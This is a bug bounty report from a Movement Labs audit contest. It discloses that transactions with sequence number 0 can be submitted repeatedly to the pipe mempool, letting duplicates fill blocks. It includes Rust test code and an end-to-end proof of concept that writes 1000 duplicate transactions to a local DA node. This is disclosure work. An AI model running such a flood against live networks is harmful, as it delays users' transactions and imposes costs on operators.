# 42762 \[BC-High] new accounts break the pipe mempool invariant that prevents duplicate transactions from filling the mempool

## #42762 \[BC-High] New accounts break the pipe mempool invariant that prevents duplicate transactions from filling the mempool

**Submitted on Mar 26th 2025 at 02:00:54 UTC by @Capybara for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #42762
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/protocol-units/execution/maptos/opt-executor>
* **Impacts:**
  * Temporary freezing of network transactions by delaying one block by 500% or more of the average block time of the preceding 24 hours beyond standard difficulty adjustments

### Description

## Details

Invariants in the DA reject adding to the mempool two transactions from the same **User** using the same **Sequence Number**.

```
 ┌──┐                              ┌──┐
 │Tx│                              │DA│
 └┬─┘                              └┬─┘
  │                                 │  
  │User "Alice", Sequence number "1"│  
  │────────────────────────────────>│  
  │                                 │  
  │            Accepted!            │  
  │<────────────────────────────────│  
  │                                 │  
  │User "Alice", Sequence number "1"│  
  │────────────────────────────────>│  
  │                                 │  
  │            Rejected!            │  
  │<────────────────────────────────│  
  │                                 │  
  │User "Alice", Sequence number "2"│  
  │────────────────────────────────>│  
  │                                 │  
  │            Accepted!            │  
  │<────────────────────────────────│  
 ┌┴─┐                              ┌┴─┐
 │Tx│                              │DA│
 └──┘                              └──┘

```

There's a test in the **Opt Executor** named `test_pipe_mempool_with_duplicate_transaction` ensuring code updates don't break this invariant:

```
	#[tokio::test]
	async fn test_pipe_mempool_with_duplicate_transaction() -> Result<(), anyhow::Error> {
		// set up
		let maptos_config = Config::default();
		let (context, mut transaction_pipe, mut tx_receiver, _tempdir) = setup().await;
		let mut mempool_client_sender = context.mempool_client_sender();
		let user_transaction = create_signed_transaction(1, &maptos_config);

		// send transaction to mempool
		let (req_sender, callback) = oneshot::channel();
		mempool_client_sender
			.send(MempoolClientRequest::SubmitTransaction(user_transaction.clone(), req_sender))
			.await?;

		// tick the transaction pipe
		transaction_pipe.tick().await?;

		// receive the callback
		let (status, _vm_status_code) = callback.await??;
		assert_eq!(status.code, MempoolStatusCode::Accepted);

		// receive the transaction
		let received_transaction =
			tx_receiver.recv().await.ok_or(anyhow::anyhow!("No transaction received"))?;
		assert_eq!(received_transaction.1, user_transaction);

		// send the same transaction again
		let (req_sender, callback) = oneshot::channel();
		mempool_client_sender
			.send(MempoolClientRequest::SubmitTransaction(user_transaction.clone(), req_sender))
			.await?;

		// tick the transaction pipe
		transaction_pipe.tick().await?;

		callback.await??;

		// assert that there is no new transaction
		assert!(tx_receiver.try_recv().is_err());

		Ok(())
	}
```

> Link to code: <https://github.com/immunefi-team/attackathon-movement/blob/a2790c6ac17b7cf02a69aea172c2b38d2be8ce00/protocol-units/execution/maptos/opt-executor/src/background/transaction\\_pipe.rs#L421-L461>

### The bug

All new accounts that have never submitted a transaction to the network start with a sequencer number of **0**, and for such accounts **0** is a valid sequence number when submitting a transaction (it will be executed successfully).

```
 ┌──┐                              ┌──┐
 │Tx│                              │DA│
 └┬─┘                              └┬─┘
  │                                 │  
  │User "Alice", Sequence number "0"│  
  │────────────────────────────────>│  
  │                                 │  
  │            Accepted!            │  
  │<────────────────────────────────│  
 ┌┴─┐                              ┌┴─┐
 │Tx│                              │DA│
 └──┘                              └──┘
```

Unfortunately, valid transactions with a sequence number of **0** can bypass the logic that prevents the same transaction from being inserted in a block multiple times.

```
 ┌──┐                              ┌──┐
 │Tx│                              │DA│
 └┬─┘                              └┬─┘
  │                                 │  
  │User "Alice", Sequence number "0"│  
  │────────────────────────────────>│  
  │                                 │  
  │            Accepted!            │  
  │<────────────────────────────────│  
  │                                 │  
  │User "Alice", Sequence number "0"│  
  │────────────────────────────────>│  
  │                                 │  
  │            Accepted!            │  
  │<────────────────────────────────│  
 ┌┴─┐                              ┌┴─┐
 │Tx│                              │DA│
 └──┘                              └──┘
```

## Impact Details

Blockchain blocks have limited space. Filling a block with valid but non-executable transactions, like in this case (duplicating a tx using a sequence number of 0), delays real user transactions from getting processed.

Additionally, each proposed batch is added to Celestia, which costs.

### Proof of Concept

### Proof of Concept

I have 2 different proof of concept for this report.

The first one is as simple as updating the current test Movement Labs created for duplicate transactions by submitting the tx with a sequence number of `0`.

The result is that the same `assert` check that used to pass in the original test will fail.

```
	#[tokio::test]
	async fn test_pipe_mempool_with_duplicate_transaction_capybara() -> Result<(), anyhow::Error> {
		// set up
		let maptos_config = Config::default();
		let (context, mut transaction_pipe, mut tx_receiver, _tempdir) = setup().await;
		let mut mempool_client_sender = context.mempool_client_sender();
		let user_transaction = create_signed_transaction(0, &maptos_config);

		// send transaction to mempool
		let (req_sender, callback) = oneshot::channel();
		mempool_client_sender
			.send(MempoolClientRequest::SubmitTransaction(user_transaction.clone(), req_sender))
			.await?;

		// tick the transaction pipe
		transaction_pipe.tick().await?;

		// receive the callback
		let (status, _vm_status_code) = callback.await??;
		assert_eq!(status.code, MempoolStatusCode::Accepted);

		// receive the transaction
		let received_transaction =
			tx_receiver.recv().await.ok_or(anyhow::anyhow!("No transaction received"))?;
		assert_eq!(received_transaction.1, user_transaction);

		// send the same transaction again
		let (req_sender, callback) = oneshot::channel();
		mempool_client_sender
			.send(MempoolClientRequest::SubmitTransaction(user_transaction.clone(), req_sender))
			.await?;

		// tick the transaction pipe
		transaction_pipe.tick().await?;

		callback.await??;

		// assert that there is no new transaction
		assert!(tx_receiver.try_recv().is_err());

		Ok(())
	}
```

> Add it to: <https://github.com/immunefi-team/attackathon-movement/blob/main/protocol-units/execution/maptos/opt-executor/src/background/transaction\\_pipe.rs#L419>

The second proof of concept is an e2e test that can be included in the file `https://github.com/immunefi-team/attackathon-movement/blob/main/protocol-units/da/movement/protocol/tests/src/test/e2e/raw/sequencer.rs`

```
#[tokio::test]
async fn test_dups_capybara() -> Result<(), anyhow::Error> {
    let mut client = LightNodeServiceClient::connect("http://0.0.0.0:30730").await?;

    // Create accounts
    let alice = LocalAccount::generate(&mut rand::rngs::OsRng);
    let bob = LocalAccount::generate(&mut rand::rngs::OsRng);

    println!("alice address: {:?}", alice.address());
    println!("bob address: {:?}", bob.address());

    // Fund account
    let faucet_client = FaucetClient::new(Url::parse("http://0.0.0.0:30732").expect("reason"), Url::parse("http://0.0.0.0:30731").expect("reason"));
    faucet_client.fund(alice.address(), 1_000_000).await.expect("Failed to fund sender account");
    faucet_client.fund(bob.address(), 1_000_000).await.expect("Failed to fund Bob's account");

    let mut transactions = vec![];
    // Create txs
    let amount: u64 = 100;
    let coin = TypeTag::from_str("0x1::aptos_coin::AptosCoin").expect("");
    let transaction_builder = TransactionBuilder::new(
        TransactionPayload::EntryFunction(EntryFunction::new(
            ModuleId::new(AccountAddress::from_str_strict("0x1")?, Identifier::new("coin")?),
            Identifier::new("transfer")?,
            vec![coin.clone()],
            vec![to_bytes(&bob.address())?, to_bytes(&amount)?],
        )),
        SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs() + 200,
        ChainId::new(27u8),
    )
        .sender(alice.address())
        .sequence_number(0)
        .max_gas_amount(5_000)
        .gas_unit_price(100);
 
    // create the blob write
    let mut signed_transaction: SignedTransaction = alice.evil_sign_fee_payer_with_transaction_builder(vec![], &alice, transaction_builder);

    let serialized_aptos_transaction = bcs::to_bytes(&signed_transaction)?;
    for i in 0..1000 {
        let mut movement_transaction1 = Transaction::new(
            serialized_aptos_transaction.clone(),
            0,
            i.clone(),
        );
        let serialized_transaction1 = serde_json::to_vec(&movement_transaction1)?;
        transactions.push(BlobWrite { data: serialized_transaction1 });
    }

    let batch_write = BatchWriteRequest { blobs: transactions };

    // write the batch to the DA
    let batch_write_reponse = client.batch_write(batch_write).await?;

    Ok(())
}
```
